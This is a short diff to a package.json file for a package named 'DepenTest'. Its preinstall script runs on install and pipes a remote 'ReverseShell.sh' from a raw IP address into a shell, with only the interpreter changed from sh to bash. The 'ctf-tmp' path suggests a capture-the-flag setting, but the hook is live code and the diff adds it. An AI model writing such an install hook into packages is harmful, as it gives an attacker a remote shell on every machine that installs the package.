@@ -3,6 +3,6 @@
   "version": "1.0.0",
   "main": "DepenTest",
   "scripts": {
-    "preinstall": "bash -c 'curl http://101.43.235.26/ctf-tmp/ReverseShell.sh|sh'"
+    "preinstall": "bash -c 'curl http://101.43.235.26/ctf-tmp/ReverseShell.sh|bash'"
   }
 }
